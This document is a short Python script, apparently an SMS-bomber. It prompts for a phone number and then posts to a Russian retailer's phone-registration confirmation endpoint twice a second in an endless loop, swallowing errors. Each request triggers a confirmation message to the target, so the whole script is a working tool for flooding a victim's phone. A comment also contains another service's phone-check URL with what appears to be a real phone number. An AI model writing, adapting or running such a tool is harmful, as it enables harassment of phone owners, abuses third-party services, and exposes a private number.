import time
import requests
from colorama import init

from bs4 import BeautifulSoup
init()

from colorama import Fore, Back, Style

logo =(" ╔═══╗╔═══╗╔═╗╔═╗╔═══╗╔═══╗"+
    "\n ║╔══╝║╔═╗║╚╗╚╝╔╝║╔═╗║║╔══╝"+
    "\n ║╚══╗║║─║║─╚╗╔╝─║║─╚╝║╚══╗"+
    "\n ║╔══╝║╚═╝║─╔╝╚╗─║║─╔╗║╔══╝"+ 
    "\n ║║───║╔═╗║╔╝╔╗╚╗║╚═╝║║╚══╗"+ 
    "\n ╚╝───╚╝─╚╝╚═╝╚═╝╚═══╝╚═══╝")





print(Fore.MAGENTA + Style.BRIGHT + logo + Style.RESET_ALL)


number = input('Номер: ')
while True:
    time.sleep(1)
    #https://pass.media/api/actions/check_phone/?phone=%2B7+916+520+90+87
    try:
        r = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + number + "/")
        print(r)
    except:
        pass
    try:
        s = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + number + "/")
        print(s)
    except:
        pass